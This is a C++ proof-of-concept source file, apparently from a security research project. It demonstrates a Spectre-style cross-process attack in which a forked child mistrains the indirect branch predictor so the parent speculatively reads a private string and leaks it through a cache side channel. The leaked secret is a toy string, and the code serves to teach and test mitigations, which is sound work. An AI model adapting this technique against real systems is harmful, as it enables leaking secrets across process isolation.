/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <array>
#include <cstring>
#include <iostream>

#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"

// Objective: given some control over accesses to the *non-secret* string
// "xxxxxxxxxxxxxx", construct a program that obtains "It's a s3kr3t!!!"
// without ever accessing it in the C++ execution model, using speculative
// execution and side channel attacks. The public data is intentionally just
// xxx, so that there are no collisions with the secret and we don't have to
// use variable offset.
const char *public_data = "xxxxxxxxxxxxxxxx";
const char *private_data = "It's a s3kr3t!!!";
constexpr size_t kAccessorArrayLength = 4096;
constexpr size_t kCacheLineSize = 64;

// Used in pointer-arithmetics and control-flow. On the child (attacker) it is
// 0, on the parent (victim) it is non-zero (it stores the pid of the child).
pid_t pid;
// Stores the parent pid. Used to terminate the child.
pid_t ppid;

// DataAccessor provides an interface to access bytes from either the public or
// the private storage.
class DataAccessor {
 public:
  virtual char GetDataByte(size_t index) = 0;
  virtual ~DataAccessor() {};
};

// PrivateDataAccessor returns private_data. Used only by the child (attacker).
class PrivateDataAccessor: public DataAccessor {
 public:
  char GetDataByte(size_t index) override {
    return private_data[index];
  }
};

// PublicDataAccessor returns public_data. Used only by the victim (parent).
class PublicDataAccessor: public DataAccessor {
 public:
  char GetDataByte(size_t index) override {
    return public_data[index];
  }
};

// Public data accessor. Used by the victim (parent). Leaks only public data.
auto public_data_accessor = std::unique_ptr<DataAccessor>(
    new PublicDataAccessor);

// Private data accessor. Used by the attacker (child). Leaks private data.
auto private_data_accessor = std::unique_ptr<DataAccessor>(
    new PrivateDataAccessor);

// On the victim (parent) it leaks data that is physically located at
// private_data[offset], without ever loading it. In the abstract machine, and
// in the code executed by the CPU, this function does not load any memory
// except for what is in the bounds of `public_data`, and local auxiliary data.
//
// Instead, the leak is performed by indirect branch prediction during
// speculative execution, the attacker (child) mistraining the predictor to
// jump to the address of GetDataByte implemented by PrivateDataAccessor that
// reads private data instead of public data.
static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
  auto array_of_pointers =
      std::unique_ptr<std::array<DataAccessor *, kAccessorArrayLength>>(
          new std::array<DataAccessor *, kAccessorArrayLength>());

  for (int run = 0;; ++run) {
    // Only the parent needs to flush the oracle.
    if (pid != 0) {
      sidechannel.FlushOracle();
    }

    // Setup all pointers to use public_data_accessor on the victim and
    // private_data_accessor on the attacker.
    for (auto &pointer : *array_of_pointers) {
      // This is a branchless equivalent of:
      // pointer = pid == 0 : private_data_accessor.get()
      //                    ? public_data_accesor.get();
      // Parent (victim) uses public_data_accessor, child (attacker) uses
      // private_data_accessor.
      pointer = private_data_accessor.get() + static_cast<bool>(pid) * (
          public_data_accessor.get() - private_data_accessor.get());
    }

    for (size_t i = 0; i < kAccessorArrayLength; ++i) {
      DataAccessor *accessor = (*array_of_pointers)[i];

      // We make sure to flush whole accessor object in case it is
      // hypothetically on multiple cache-lines.
      const char *accessor_bytes = reinterpret_cast<const char*>(accessor);

      for (size_t j = 0; j < sizeof(PublicDataAccessor); j += kCacheLineSize) {
        CLFlush(accessor_bytes + j);
      }

      // Speculative fetch at the offset. Architecturally the victim fetches
      // always from the public_data, though speculatively it fetches the
      // private_data when it is mistrained.
      ForceRead(isolated_oracle.data() + static_cast<size_t>(
            accessor->GetDataByte(offset)));
    }

    // Only the parent (victim) computes results.
    if (pid != 0) {
      std::pair<bool, char> result =
          sidechannel.RecomputeScores(public_data[offset]);
      if (result.first) {
        return result.second;
      }

      if (run > 100000) {
        std::cerr << "Does not converge " << result.second << std::endl;
        exit(EXIT_FAILURE);
      }
    }

    // If the parent pid changed, the original parent is dead and the child
    // should terminate too.
    if (pid == 0 && getppid() != ppid) {
      exit(EXIT_SUCCESS);
    }

    // Let the other process run to increase the interference.
    sched_yield();
  }
}

void ChildProcess() {
  // Infinitely interfere with the critical branching. Results are not
  // interesting.
  LeakByte(0);
}

void ParentProcess() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(public_data); ++i) {
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}

int main() {
  // We need both processes to run on the same core. Pinning the parent before
  // the fork to the first core. The child inherits the settings.
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  int res = sched_setaffinity(getpid(), sizeof(set), &set);
  if (res != 0) {
    std::cout << "CPU affinity setup failed." << std::endl;
    exit(EXIT_FAILURE);
  }

  // Record the parent pid for the death check in the child. When the parent pid
  // changes for the child, it means that the child should terminate.
  ppid = getpid();

  pid = fork();
  if (pid == 0) {
    // Child is the attacker.
    ChildProcess();
  } else {
    // Parent is the victim.
    ParentProcess();
  }
}
